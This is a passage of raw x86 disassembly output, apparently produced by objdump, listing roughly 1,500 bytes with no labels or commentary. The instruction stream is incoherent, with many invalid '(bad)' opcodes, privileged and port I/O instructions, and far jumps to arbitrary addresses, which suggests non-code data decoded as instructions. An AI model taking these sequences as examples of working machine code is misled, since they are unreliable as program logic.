  414e29:	or     eax,0xe3b9ab09
  414e2e:	mov    ds:0x9ee3d3b2,al
  414e33:	xchg   DWORD PTR [esi+0x5338dced],ecx
  414e39:	jne    0x414e78
  414e3b:	inc    eax
  414e3c:	add    eax,0x2cbd5ae4
  414e41:	mov    edi,DWORD PTR [edi-0x2ef9b09d]
  414e47:	or     cl,BYTE PTR [ecx+0x15e4112]
  414e4d:	neg    DWORD PTR [ebx-0x4a]
  414e50:	iret   
  414e51:	nop
  414e52:	idiv   BYTE PTR [ecx+ebp*2]
  414e55:	(bad)  
  414e56:	mov    WORD PTR [ebx-0x5fa9411e],es
  414e5c:	loope  0x414e15
  414e5e:	shl    BYTE PTR [edx-0x51867825],1
  414e64:	adc    al,0x17
  414e66:	aam    0x6
  414e68:	mov    cl,0x3
  414e6a:	lahf   
  414e6b:	repnz sbb DWORD PTR [edx-0x56],ecx
  414e6f:	inc    esi
  414e70:	sbb    BYTE PTR [edx],al
  414e72:	pushf  
  414e73:	jmp    0x414e5f
  414e75:	jg     0x414ef4
  414e77:	push   es
  414e78:	in     eax,dx
  414e79:	cmp    al,BYTE PTR [esi+esi*4]
  414e7c:	xchg   ebx,eax
  414e7d:	xchg   ebx,eax
  414e7e:	push   ebp
  414e7f:	push   ss
  414e80:	inc    esp
  414e81:	push   ecx
  414e82:	fadd   DWORD PTR [ebp-0x28]
  414e85:	scas   al,BYTE PTR es:[edi]
  414e86:	adc    BYTE PTR [ebx+0x74c221ba],dh
  414e8c:	sti    
  414e8d:	out    0x2e,eax
  414e8f:	cmp    al,0x3b
  414e91:	dec    ecx
  414e92:	pushf  
  414e93:	push   0x793a1ac9
  414e98:	rcl    BYTE PTR [eax+0x60],1
  414e9b:	xor    DWORD PTR [edi+0x3d],edx
  414e9e:	inc    ebx
  414e9f:	xchg   esi,eax
  414ea0:	jl     0x414f16
  414ea2:	add    eax,0xe2feb3bc
  414ea7:	scas   al,BYTE PTR es:[edi]
  414ea8:	(bad)  
  414ea9:	hlt    
  414eaa:	sub    dl,BYTE PTR [esi-0x3]
  414ead:	sub    eax,0x5bdc88e9
  414eb2:	mov    ds:0xf1d26312,al
  414eb7:	jl     0x414e73
  414eb9:	rcl    BYTE PTR [edx+ecx*2-0x2c],1
  414ebd:	fmul   DWORD PTR [ecx-0x7]
  414ec0:	push   cs
  414ec1:	mov    eax,DWORD PTR [edi]
  414ec3:	mov    ds:0xdb00bcf2,al
  414ec8:	mov    ah,0xfd
  414eca:	inc    edi
  414ecb:	imul   ebx,DWORD PTR [edx-0x3c],0x56
  414ecf:	fsubr  DWORD PTR [ecx+ebp*1-0x1d]
  414ed3:	pop    eax
  414ed4:	fld    QWORD PTR ds:0x4acdb4d6
  414eda:	movntps XMMWORD PTR [ecx+0x717431e6],xmm7
  414ee1:	ins    BYTE PTR es:[edi],dx
  414ee2:	pop    eax
  414ee3:	sbb    al,0xf4
  414ee5:	lahf   
  414ee6:	int3   
  414ee7:	xor    eax,0xd6218ceb
  414eec:	into   
  414eed:	lea    eax,[esi]
  414eef:	lea    ecx,[edi+0x8]
  414ef2:	adc    edx,DWORD PTR [eax]
  414ef4:	inc    ebp
  414ef5:	fbstp  TBYTE PTR [ecx-0x27]
  414ef9:	fimul  DWORD PTR [edx-0x54ef5389]
  414eff:	xchg   ebp,eax
  414f00:	enter  0x3c95,0x97
  414f04:	(bad)  [edx-0x9d437d0]
  414f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0b:	mov    ds:0xdb9fcc42,al
  414f10:	mov    dl,0xfd
  414f12:	mov    ecx,0xb0a99809
  414f17:	push   0xffffffd3
  414f19:	mov    cl,0x4
  414f1b:	adc    al,0x7a
  414f1d:	les    ebx,FWORD PTR [ebx-0x7aca4728]
  414f23:	mov    dh,0xd0
  414f25:	mov    ah,0xe4
  414f27:	retf   0xd995
  414f2a:	leave  
  414f2b:	pop    ebx
  414f2c:	cmp    dh,BYTE PTR [esi]
  414f2e:	dec    esp
  414f2f:	push   ebp
  414f30:	xor    BYTE PTR ds:0xb4896e43,dl
  414f36:	in     al,0x4e
  414f38:	mov    ds:0xc4b3dbed,al
  414f3d:	popf   
  414f3e:	add    BYTE PTR [ecx],0xfe
  414f41:	xchg   esi,eax
  414f42:	mov    cl,0xb2
  414f44:	sub    al,0x77
  414f46:	mov    ebx,0xa3fe05cd
  414f4b:	cdq    
  414f4c:	inc    eax
  414f4d:	add    DWORD PTR [eax-0xf],esp
  414f50:	mov    esi,0x63ae1563
  414f55:	and    al,0x69
  414f57:	pusha  
  414f58:	call   0x1e6e1c65
  414f5d:	imul   ebx,DWORD PTR [edi+0x12606a4c],0xc8c72ba8
  414f67:	push   cs
  414f68:	sbb    al,0x68
  414f6a:	int3   
  414f6b:	and    eax,DWORD PTR [edx+0x3d5b35a9]
  414f71:	test   BYTE PTR [ecx],al
  414f73:	sti    
  414f74:	addr16 push ebx
  414f76:	mov    ds,WORD PTR [edi+0x29]
  414f79:	dec    edx
  414f7a:	push   eax
  414f7b:	sub    al,0x9b
  414f7d:	in     al,dx
  414f7e:	scas   al,BYTE PTR es:[edi]
  414f7f:	imul   ebx,DWORD PTR [esi-0x13cf72d8],0x8b666e3c
  414f89:	mov    edi,0x15f92445
  414f8e:	fwait
  414f8f:	(bad)  
  414f90:	sub    al,0xad
  414f92:	fucomip st,st(3)
  414f94:	sub    ch,BYTE PTR [edx+0x55e680c6]
  414f9a:	aaa    
  414f9b:	pushf  
  414f9c:	ss cbw 
  414f9f:	mov    es,esp
  414fa1:	mov    dh,0xed
  414fa3:	nop
  414fa4:	rcl    BYTE PTR [edi-0x68b96d1f],0x12
  414fab:	mov    ecx,0x95bf8b1
  414fb0:	ret    0xbbd0
  414fb3:	xlat   BYTE PTR ds:[ebx]
  414fb4:	mov    esp,DWORD PTR [ebx-0x5a85be9e]
  414fba:	add    eax,0x1de0ada7
  414fbf:	sar    BYTE PTR [ebx-0x47fe38e5],1
  414fc5:	push   cs
  414fc6:	iret   
  414fc7:	shl    DWORD PTR [ecx+0x7e93a653],1
  414fcd:	xchg   esp,eax
  414fce:	fnsave [edx-0x2bcacdb1]
  414fd4:	or     al,0x6b
  414fd6:	les    esp,FWORD PTR [edi+ecx*1+0x624bdedb]
  414fdd:	jle    0x414f85
  414fdf:	sub    dl,BYTE PTR [ecx*4+0x41e17171]
  414fe6:	dec    edi
  414fe7:	mov    eax,ds:0x9510e4e3
  414fed:	js     0x414fb0
  414fef:	mov    esp,0xe0500fba
  414ff4:	mov    DWORD PTR [ecx+ebp*2-0x5dd2ab0],edx
  414ffb:	pop    eax
  414ffc:	xchg   edi,eax
  414ffd:	imul   esp,DWORD PTR [edi+0x253d2c60],0xc
  415004:	rcr    DWORD PTR [ebp-0x3],1
  415007:	pop    esp
  415008:	sub    dl,BYTE PTR [ebp+0x63]
  41500b:	cmp    dh,BYTE PTR [esi+0x41]
  41500e:	std    
  41500f:	mov    esp,0x31a446d1
  415014:	xchg   esi,eax
  415015:	mov    cl,0xbe
  415017:	je     0x415017
  415019:	push   ecx
  41501a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41501b:	punpckhbw mm0,QWORD PTR [esi+0x2c]
  41501f:	or     al,0x11
  415021:	das    
  415022:	pop    ebx
  415023:	mov    edi,0xcf2dcc4a
  415028:	loope  0x415097
  41502a:	std    
  41502b:	xchg   edi,eax
  41502c:	shl    DWORD PTR [ebx+0x4dfc9ddc],1
  415032:	in     al,0xdc
  415034:	cmp    al,0xb0
  415036:	and    eax,0xba0701ca
  41503b:	(bad)
  41503e:	cwde   
  41503f:	stos   BYTE PTR es:[edi],al
  415040:	call   0x34ad87db
  415045:	cwde   
  415046:	push   ebx
  415047:	lahf   
  415048:	data16 xor BYTE PTR [esi-0x100a131e],dl
  41504f:	loope  0x415082
  415051:	aam    0x48
  415053:	mov    esp,0x9a716a58
  415058:	push   0x2dbf4ea9
  41505d:	mov    cl,0x68
  41505f:	ss cmp eax,0xd2bd3dde
  415065:	scas   al,BYTE PTR es:[edi]
  415066:	clts   
  415068:	xchg   edi,eax
  415069:	push   es
  41506a:	aam    0x92
  41506c:	xor    DWORD PTR [ebx+edi*1],edx
  41506f:	inc    ebp
  415070:	pop    ecx
  415071:	xchg   ebp,eax
  415072:	or     al,BYTE PTR [ebx+0x51e0f830]
  415078:	imul   esp,DWORD PTR [esi-0x35],0xba27c6c
  41507f:	mov    cl,0xb5
  415081:	in     al,dx
  415082:	push   0x4becafaf
  415087:	lea    ecx,[edi-0xf67fc5a]
  41508d:	fistp  DWORD PTR [edi]
  41508f:	fdiv   QWORD PTR [edi]
  415091:	dec    edx
  415092:	mov    bh,0xef
  415094:	scas   al,BYTE PTR es:[edi]
  415095:	inc    ebx
  415096:	cmp    BYTE PTR [ebx],bl
  415098:	(bad)  
  415099:	scas   al,BYTE PTR es:[edi]
  41509a:	nop
  41509b:	add    al,cl
  41509d:	dec    edi
  41509e:	jecxz  0x415103
  4150a0:	add    ebx,esp
  4150a2:	sub    dh,BYTE PTR [ebx+0xb35f365]
  4150a8:	cs push es
  4150aa:	inc    esi
  4150ab:	sub    BYTE PTR [ebp-0x23],bl
  4150ae:	popf   
  4150af:	pop    eax
  4150b0:	jge    0x41503d
  4150b2:	or     BYTE PTR [edx-0x5c],dh
  4150b5:	fsubr  DWORD PTR [edi-0x20]
  4150b8:	or     DWORD PTR [ecx+0x60],edi
  4150bb:	mov    ds:0x59386934,al
  4150c0:	icebp  
  4150c1:	jmp    0x26626eb0
  4150c6:	xor    bl,bh
  4150c8:	add    al,0x9d
  4150ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150cb:	enter  0x16bf,0x2d
  4150cf:	or     bh,BYTE PTR [eax+ebx*8]
  4150d2:	std    
  4150d3:	jmp    0x415107
  4150d5:	or     ah,al
  4150d7:	das    
  4150d8:	xchg   DWORD PTR [eax+0x6e19944f],ebx
  4150de:	aam    0xc5
  4150e0:	push   esi
  4150e1:	adc    DWORD PTR [esi+ebx*8],edx
  4150e4:	mov    ebp,0x96472959
  4150e9:	mov    ecx,DWORD PTR [edi+edi*8]
  4150ec:	add    eax,0x51b9737a
  4150f1:	in     eax,0x19
  4150f3:	lods   al,BYTE PTR ds:[esi]
  4150f4:	sahf   
  4150f5:	mov    dh,0x5c
  4150f7:	cwde   
  4150f8:	pop    esi
  4150f9:	out    0xe3,eax
  4150fb:	push   esp
  4150fc:	xor    DWORD PTR [edx+0x4337c575],eax
  415102:	pop    ebp
  415103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415104:	push   cs
  415105:	mov    ds:0x7448ee56,eax
  41510a:	dec    edi
  41510b:	cmp    BYTE PTR ds:0xf7ada14,dl
  415111:	call   0x7662:0x40dc13a9
  415118:	add    DWORD PTR [edi],edx
  41511a:	dec    esi
  41511b:	or     eax,0xf9fd12d
  415120:	leave  
  415121:	push   esi
  415122:	cs push edx
  415124:	pop    ebp
  415125:	scas   eax,DWORD PTR es:[edi]
  415126:	xchg   edx,eax
  415127:	stos   BYTE PTR es:[edi],al
  415128:	add    al,0x41
  41512a:	mov    ah,bh
  41512c:	jbe    0x4151ab
  41512e:	sti    
  41512f:	mov    ds:0xb8420cb4,al
  415134:	jnp    0x415115
  415136:	or     ebp,DWORD PTR [eax+0x4855bca4]
  41513c:	cwde   
  41513d:	std    
  41513e:	mov    eax,ds:0x55019844
  415143:	pop    esi
  415144:	sub    dh,ah
  415146:	push   ecx
  415147:	in     eax,0x5c
  415149:	test   al,0xa5
  41514b:	sti    
  41514c:	in     eax,dx
  41514d:	mov    ebp,0x37117238
  415152:	imul   ebx,edi,0x31
  415155:	test   eax,0xf1cf52c7
  41515a:	mov    dl,0xb6
  41515c:	ds (bad) 
  41515e:	cmp    DWORD PTR [ebp+0x41],ebp
  415161:	jle    0x4151cb
  415163:	dec    esp
  415164:	push   edx
  415165:	and    bl,BYTE PTR [ebx+0xe]
  415168:	imul   eax,DWORD PTR [ecx],0xffffff8d
  41516b:	nop
  41516c:	sbb    al,0xc1
  41516e:	cmp    DWORD PTR [edi-0x78466c31],edx
  415174:	jnp    0x415115
  415176:	cmp    eax,0x30809a98
  41517b:	loopne 0x415109
  41517d:	pop    ebx
  41517e:	scas   al,BYTE PTR es:[edi]
  41517f:	xchg   edi,eax
  415180:	dec    ebx
  415181:	pop    es
  415182:	mov    dh,0xf4
  415184:	ss xchg esp,eax
  415186:	cld    
  415187:	fistp  QWORD PTR [ebx-0x3a]
  41518a:	popa   
  41518b:	cwde   
  41518c:	and    BYTE PTR [eax-0x74],bh
  41518f:	icebp  
  415190:	sbb    DWORD PTR [esi],0xffffffbf
  415193:	fsub   DWORD PTR [ebx]
  415195:	(bad)  
  415197:	push   0x74fdcd30
  41519c:	xchg   esp,eax
  41519d:	mov    edi,DWORD PTR [ebp+0x10]
  4151a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a1:	push   esp
  4151a2:	and    al,0xe8
  4151a4:	jmp    0x3d8f:0x5890926d
  4151ab:	inc    edi
  4151ac:	pop    ecx
  4151ad:	push   esp
  4151ae:	sti    
  4151af:	popa   
  4151b0:	fucomi st,st(7)
  4151b2:	je     0x4151a0
  4151b4:	dec    edi
  4151b5:	and    eax,0x6f2ac5ed
  4151ba:	add    DWORD PTR [eax-0x21],edi
  4151bd:	pushf  
  4151be:	mov    edx,ebx
  4151c0:	sbb    cl,BYTE PTR [ebx+edx*2]
  4151c3:	inc    edx
  4151c4:	mov    al,0xd9
  4151c6:	nop
  4151c7:	push   eax
  4151c8:	push   ss
  4151c9:	add    eax,0x80e55c5a
  4151ce:	sub    esp,0xffffffdd
  4151d1:	pop    edx
  4151d2:	push   ds
  4151d3:	js     0x4151f3
  4151d5:	jle    0x415158
  4151d7:	jge    0x4151f4
  4151d9:	and    BYTE PTR [ecx+0x46825203],ch
  4151df:	pusha  
  4151e0:	push   edi
  4151e1:	je     0x415251
  4151e3:	fwait
  4151e4:	test   ah,0x79
  4151e7:	mov    edx,0x7dcb36d8
  4151ec:	imul   DWORD PTR [esi+ebx*2+0x78]
  4151f0:	adc    eax,DWORD PTR [esi+0x63]
  4151f3:	out    0xaa,al
  4151f5:	aam    0x12
  4151f7:	popf   
  4151f8:	ror    edx,1
  4151fa:	out    0x6,eax
  4151fc:	out    dx,al
  4151fd:	aam    0x29
  4151ff:	int    0x9b
  415201:	adc    ah,0x1
  415204:	leave  
  415205:	cmp    DWORD PTR [edi+0x3a2db389],esp
  41520b:	lock lds ecx,FWORD PTR gs:[esi-0x25]
  415210:	xchg   ebx,eax
  415211:	xchg   edi,eax
  415212:	sub    BYTE PTR [ecx+ebx*8+0xd19686],bh
  415219:	xor    ch,ch
  41521b:	sbb    dh,bl
  41521d:	jle    0x4151b3
  41521f:	or     bl,BYTE PTR [eax-0x3e739ab5]
  415225:	dec    ebp
  415226:	pop    ds
  415227:	les    edx,FWORD PTR [ebx]
  415229:	in     al,dx
  41522a:	add    BYTE PTR [edx+0x2f],al
  41522d:	cmp    al,0x1e
  41522f:	aam    0x8f
  415231:	pop    edx
  415232:	mov    eax,0xb7e50de4
  415237:	out    dx,eax
  415238:	push   eax
  415239:	jge    0x415202
  41523b:	ss cld 
  41523d:	popa   
  41523e:	shr    bh,1
  415240:	retf   0xd4ec
  415243:	fiadd  WORD PTR [ebx]
  415245:	stos   DWORD PTR es:[edi],eax
  415246:	pop    esp
  415247:	repz cmp ebp,DWORD PTR [eax+edx*2-0x6f]
  41524c:	addr16 nop
  41524e:	in     eax,dx
  41524f:	fldenv [edi+0x69]
  415252:	fsubrp st(1),st
  415254:	je     0x4152cb
  415256:	mov    al,ds:0xb633b9e8
  41525b:	xchg   esi,eax
  41525c:	icebp  
  41525d:	sti    
  41525e:	push   esi
  41525f:	movzx  ebp,WORD PTR [eax]
  415262:	adc    bl,BYTE PTR ds:0x8e16c299
  415268:	xchg   DWORD PTR [ecx],esi
  41526a:	(bad)  
  41526b:	cli    
  41526c:	cmp    eax,0xab4ed9d2
  415271:	pop    edx
  415272:	daa    
  415273:	rcr    ch,1
  415275:	(bad)  
  415276:	int3   
  415277:	retf   
  415278:	ss inc edx
  41527a:	int3   
  41527b:	or     esi,DWORD PTR [ebx]
  41527d:	mov    al,0x9a
  41527f:	mov    ch,0x58
  415281:	sub    BYTE PTR ds:0xc5481d15,0x1e
  415288:	js     0x4152ee
  41528a:	xchg   BYTE PTR [ebx-0x6a6f126b],ch
  415290:	and    al,BYTE PTR [ecx]
  415292:	mov    edi,0xdfcb85cc
  415297:	test   eax,0xf9832d52
  41529c:	jbe    0x415242
  41529e:	push   ss
  41529f:	out    dx,al
  4152a0:	pushf  
  4152a1:	mov    ds:0x603937d0,eax
  4152a6:	lods   eax,DWORD PTR ds:[esi]
  4152a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152a8:	mov    dl,bh
  4152aa:	xor    edi,DWORD PTR ds:0xfcad0a6e
  4152b0:	push   esi
  4152b1:	lds    esi,FWORD PTR [edi+0x2f53be72]
  4152b7:	pop    eax
  4152b8:	jge    0x415319
  4152ba:	xor    al,BYTE PTR ds:[edx+0x5d]
  4152be:	or     BYTE PTR [ebx],bh
  4152c0:	bnd jbe 0x415305
  4152c3:	push   fs
  4152c5:	and    al,0x8d
  4152c7:	stos   DWORD PTR es:[edi],eax
  4152c8:	sub    bh,BYTE PTR [ecx]
  4152ca:	jb     0x4152ea
  4152cc:	jmp    0x4152d4
  4152ce:	ret    
  4152cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d0:	outs   dx,BYTE PTR ds:[esi]
  4152d1:	push   ds
  4152d2:	push   ebx
  4152d3:	mov    ebx,0xa89e04a0
  4152d8:	int    0xfe
  4152da:	pop    ebx
  4152db:	stos   DWORD PTR es:[edi],eax
  4152dc:	xchg   edx,eax
  4152dd:	mov    edx,DWORD PTR [ebx-0x6a066f37]
  4152e3:	cs mov esp,0x929d998a
  4152e9:	jmp    0x529e:0x4ebb82a2
  4152f0:	lahf   
  4152f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152f2:	cmp    DWORD PTR [ecx+edi*8-0x23de6d8d],ebx
  4152f9:	adc    al,0x90
  4152fb:	add    dl,BYTE PTR [ecx+0x57]
  4152fe:	push   cs
  4152ff:	cmc    
  415300:	or     al,0x1
  415302:	push   cs
  415303:	xchg   bh,ah
  415305:	inc    edx
  415306:	shr    DWORD PTR [edi+0x66569107],1
  41530c:	push   ebp
  41530d:	mov    DWORD PTR [edx-0x26],0xf78bef03
  415314:	inc    ecx
  415315:	(bad)  
  415316:	cli    
  415317:	and    ecx,0xe0234be9
  41531d:	push   cs
  41531e:	mov    WORD PTR [ecx+eiz*2+0x33],ds
  415322:	retf   0x153f
  415325:	lods   eax,DWORD PTR ds:[esi]
  415326:	clc    
  415327:	inc    ebp
  415328:	iret   
  415329:	xchg   ebp,eax
  41532a:	out    0xc0,eax
  41532c:	rol    BYTE PTR [eax+0x13ec085c],cl
  415332:	mov    WORD PTR [ebx-0x67437363],es
  415338:	jns    0x415391
  41533a:	jg     0x4153a2
  41533c:	ret    0x10ff
  41533f:	inc    edi
  415340:	jecxz  0x4152df
  415342:	mov    esi,edi
  415344:	scas   al,BYTE PTR es:[edi]
  415345:	shr    BYTE PTR [eax+edx*4-0x61a14135],1
  41534c:	in     al,0x71
  41534e:	cmp    al,0xc
  415350:	push   ecx
  415351:	test   BYTE PTR [edi],dl
  415353:	cdq    
  415354:	fisttp DWORD PTR [edi-0x4]
  415357:	in     eax,dx
  415358:	pop    eax
  415359:	lock push edi
  41535b:	sub    al,0x1
  41535d:	rol    DWORD PTR [esi],0x5f
  415360:	xchg   edx,ebx
  415362:	leave  
  415363:	jb     0x415375
  415365:	(bad)  
  415366:	dec    ecx
  415367:	arpl   WORD PTR [ebx],cx
  415369:	pop    edx
  41536a:	fimul  DWORD PTR gs:[ebp*2+0x288cd23c]
  415372:	xor    DWORD PTR [edx+0x61],0x7b238ad0
  415379:	push   edi
  41537a:	sub    bh,BYTE PTR ds:0x56e7e323
  415380:	test   al,0x8e
  415382:	retf   
  415383:	shl    DWORD PTR [eax+0x31],1
  415386:	xchg   edx,eax
  415387:	mov    bl,0x94
  415389:	out    dx,eax
  41538a:	push   0xfd03e8f7
  41538f:	test   al,0x35
  415391:	test   ah,cl
  415393:	jo     0x415362
  415395:	dec    esp
  415396:	jns    0x415383
  415398:	pop    DWORD PTR [eax-0x32]
  41539b:	stc    
  41539c:	es jmp 0x55c4f714
  4153a2:	adc    al,0x82
  4153a4:	pusha  
  4153a5:	fdiv   st,st(5)
  4153a7:	arpl   WORD PTR [ecx],si
  4153a9:	dec    ecx
  4153aa:	dec    ebx
  4153ab:	xor    al,0x18
  4153ad:	arpl   WORD PTR [esi-0x42493f14],di
  4153b3:	adc    al,0x6a
  4153b5:	add    DWORD PTR [eax],ecx
  4153b7:	lea    esp,[ecx]
  4153b9:	sub    ebx,esi
  4153bb:	data16 scas al,BYTE PTR es:[edi]
  4153bd:	fs sbb ch,cl
  4153c0:	mov    edx,0x95eb7f19
  4153c5:	sub    ch,BYTE PTR [ecx]
  4153c7:	push   cs
  4153c8:	aad    0x82
  4153ca:	aas    
  4153cb:	(bad)  
  4153cc:	sub    BYTE PTR [eax-0x7d4b8e67],ah
  4153d2:	adc    eax,0x2dabe88c
  4153d7:	xchg   ebx,eax
  4153d8:	inc    esi
  4153d9:	dec    ebx
  4153da:	adc    BYTE PTR [ecx],bh
  4153dc:	cmp    bl,BYTE PTR [eax-0x2a]
  4153df:	ins    BYTE PTR es:[edi],dx
  4153e0:	inc    ebx
  4153e1:	pop    esp
  4153e2:	push   eax
  4153e3:	lea    edi,[edi+0x2]
  4153e6:	cmp    bh,bl
  4153e8:	xor    eax,0x47d3ce99
  4153ed:	test   BYTE PTR [esi],0x80
  4153f0:	(bad)  
  4153f1:	out    0x84,eax
  4153f3:	xchg   ebx,eax
  4153f4:	mov    ah,0xc
  4153f6:	adc    esp,eax
  4153f8:	mov    ds:0x4925bb9f,al
  4153fd:	mov    ds:0x3f287529,eax
  415402:	mov    eax,0xd88e1209
  415407:	fcom   QWORD PTR [esi+0x3ce0e07c]
  41540d:	push   eax
  41540e:	jb     0x415421
  415410:	add    al,BYTE PTR es:[ebp+0x38c2612e]
  415417:	inc    ecx
  415418:	rcl    DWORD PTR [esi-0x1587963a],0xc7
  41541f:	and    dl,al
  415421:	call   0x9e496393
  415426:	mov    esi,0x573d21da
  41542b:	popf   
  41542c:	enter  0x563a,0x97
  415430:	mov    ah,0x5f
  415432:	ins    DWORD PTR es:[edi],dx
  415433:	jmp    0xfa2b:0xec94db46
  41543a:	adc    DWORD PTR [ebx],0x20b00a0e
  415440:	sbb    eax,0xd9b65d1a
  415445:	mov    cl,bh
  415447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415448:	jecxz  0x41549d
  41544a:	push   eax
  41544b:	ins    BYTE PTR es:[edi],dx
  41544c:	push   cs
  41544d:	and    ecx,esi
  41544f:	mul    esp
  415451:	repnz loopne 0x415487
  415454:	add    DWORD PTR [esi],ebp
  415456:	sahf   
  415457:	or     DWORD PTR [edi+0x1c],edx
  41545a:	retf   0xc45a
  41545d:	std    
  41545e:	je     0x41541f
  415460:	in     al,dx
  415461:	jne    0x4154d9
  415463:	jo     0x41541b
  415465:	dec    esi
  415466:	or     eax,0xa145f37a
  41546b:	iret   
  41546c:	shr    BYTE PTR [ebp-0x18c08d19],cl
  415472:	mov    dh,bh
  415474:	test   BYTE PTR [edi+0x3b3ae8fd],bl
  41547a:	cmp    al,0x9d
  41547c:	loopne 0x41544f
  41547e:	xlat   BYTE PTR ds:[ebx]
  41547f:	dec    esp
  415480:	outs   dx,DWORD PTR ds:[esi]
  415481:	cmp    bl,bh
  415483:	add    ah,BYTE PTR [eax-0x19]
  415486:	push   ebp
  415487:	test   al,0x70
  415489:	xor    DWORD PTR [edi],ecx
  41548b:	pavgb  mm4,QWORD PTR [ecx]
  41548e:	in     al,0xf6
  415490:	mov    ds:0xe4870183,eax
  415495:	pop    es
  415496:	sub    al,0xc0
  415498:	xchg   edx,eax
  415499:	repnz es mov cl,al
  41549d:	mov    BYTE PTR [ebx-0x31],ah
  4154a0:	addr16 jmp 0xb0f4:0x5492230c
  4154a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154a9:	jns    0x415433
  4154ab:	mov    ecx,0xa5df8738
  4154b0:	mov    esp,0x6fd9c922
  4154b5:	xchg   esi,eax
  4154b6:	cli    
  4154b7:	shl    bl,0x99
  4154ba:	mov    es,WORD PTR [eax-0x14]
  4154bd:	jge    0x4154b5
  4154bf:	scas   al,BYTE PTR es:[edi]
  4154c0:	mov    edi,0xd6abaf5a
  4154c5:	shl    cl,1
  4154c7:	push   ss
  4154c8:	test   DWORD PTR [eax],eax
  4154ca:	imul   ebx,edi,0xffffff96
  4154cd:	mov    DWORD PTR [esi],edx
  4154cf:	add    ah,dh
  4154d1:	add    eax,0x25683686
  4154d6:	icebp  
  4154d7:	iret   
  4154d8:	adc    DWORD PTR [esi-0x40],esp
  4154db:	push   edx
  4154dc:	sub    DWORD PTR [edi-0x72f2ccf9],eax
  4154e2:	mov    dl,0x55
  4154e4:	imul   ecx,ebp,0xe7eb5b65
  4154ea:	pop    esi
  4154eb:	jnp    0x415506
  4154ed:	pop    ds
  4154ee:	hlt    
  4154ef:	loopne 0x41556b
  4154f1:	or     ebx,ebp
  4154f3:	test   eax,0xa954f94c
  4154f8:	(bad)  
  4154f9:	int3   
  4154fa:	jecxz  0x415555
  4154fc:	pop    edx
  4154fd:	xor    al,0x17
  4154ff:	jg     0x41557f
  415501:	sbb    dh,BYTE PTR [ebp-0x2a]
  415504:	aas    
  415505:	das    
  415506:	js     0x41550b
  415508:	ja     0x4154b0
  41550a:	add    eax,0x16cb7a2a
  41550f:	es sti 
  415511:	add    al,0xe9
  415513:	call   0xd214:0xe228688b
  41551a:	and    DWORD PTR [ecx+0x2c],esp
  41551d:	push   es
  41551e:	inc    ebx
  41551f:	out    0x57,eax
  415521:	sub    edi,DWORD PTR ds:0x682f616c
  415527:	sbb    ah,bh
  415529:	loope  0x415565
  41552b:	xchg   esp,eax
  41552c:	stos   DWORD PTR es:[edi],eax
  41552d:	leave  
  41552e:	mov    dh,0x6c
  415530:	and    eax,0xd626fa2a
  415535:	xor    DWORD PTR [ebp-0x7c],esi
  415538:	lahf   
  415539:	mov    ebx,0x2401b11a
  41553e:	gs dec ebp
  415540:	jmp    0xc21a:0xbdc592c7
  415547:	push   0xca3e1fee
  41554c:	inc    edi
  41554d:	dec    edi
  41554e:	xor    eax,0x8dba475c
  415553:	loope  0x415562
  415555:	adc    eax,0x78cc320c
  41555a:	sti    
  41555b:	mov    esi,0x55f29efe
  415560:	mov    ch,0xce
  415562:	inc    ebx
  415563:	iret   
  415564:	mov    bl,0x57
  415566:	adc    DWORD PTR [eax],0xffffffbb
  415569:	fmul   DWORD PTR [eax+ecx*4]
  41556c:	push   eax
  41556d:	jns    0x4155a9
  41556f:	repnz pop eax
  415571:	(bad)  
  415572:	je     0x4155c7
  415574:	stos   DWORD PTR es:[edi],eax
  415575:	mov    ebp,0x24faf145
  41557a:	xor    BYTE PTR [ecx],dh
  41557c:	mov    ah,0xbc
  41557e:	sahf   
  41557f:	outs   dx,BYTE PTR ds:[esi]
  415580:	pop    ss
  415581:	mov    cl,0x48
  415583:	fwait
  415584:	clc    
  415585:	nop
  415586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415588:	mov    ds:0xa28d68ad,al
  41558d:	mov    al,ds:0xae2e1f97
  415592:	inc    edi
  415593:	mov    eax,0x51749190
  415598:	or     al,0x9d
  41559a:	dec    eax
  41559b:	xchg   esi,eax
  41559c:	push   ss
  41559d:	sub    esi,DWORD PTR [esi]
  41559f:	pushf  
  4155a0:	mov    edx,0x3a28583a
  4155a5:	mov    BYTE PTR [esi+esi*8-0x56440ede],bh
  4155ac:	sub    eax,0x2af2ceb
  4155b1:	dec    edx
  4155b2:	stc    
  4155b3:	aaa    
  4155b4:	xchg   ebp,eax
  4155b5:	jbe    0x415594
  4155b7:	cld    
  4155b8:	es push cs
  4155ba:	idiv   DWORD PTR ds:[ecx]
  4155bd:	mov    ah,0x55
  4155bf:	ss out dx,eax
  4155c1:	call   0x1f1a9bf9
  4155c6:	pop    edx
  4155c7:	push   es
  4155c8:	sub    esp,esp
  4155ca:	cmp    BYTE PTR [edi+0x79],dl
  4155cd:	cmp    esp,DWORD PTR [ecx-0x5ef25740]
  4155d3:	pop    edx
  4155d4:	mov    esp,0xa454fac5
  4155d9:	xlat   BYTE PTR ds:[ebx]
  4155da:	pop    es
  4155db:	into   
  4155dc:	push   cs
  4155dd:	or     al,0xf
  4155df:	and    BYTE PTR [edi],al
  4155e1:	mov    dh,0xfa
  4155e3:	popf   
  4155e4:	xchg   BYTE PTR [esi-0x591e58c1],bl
  4155ea:	je     0x41562a
  4155ec:	(bad)  
  4155ed:	adc    edx,ebp
  4155ef:	pop    ebp
  4155f0:	jp     0x415593
  4155f2:	call   0xd912:0x5968e9a3
  4155f9:	cli    
  4155fa:	adc    ch,BYTE PTR [ecx+eax*4-0x4185443b]
  415601:	addr16 pushf 
  415603:	ja     0x41565b
  415605:	inc    edi
  415606:	or     esi,ecx
  415608:	(bad)  
  415609:	ficom  DWORD PTR [ebx+0x7ea412fe]
  41560f:	or     eax,0x53058e5f
  415614:	jl     0x415685
  415616:	shl    DWORD PTR [esp+eax*4],1
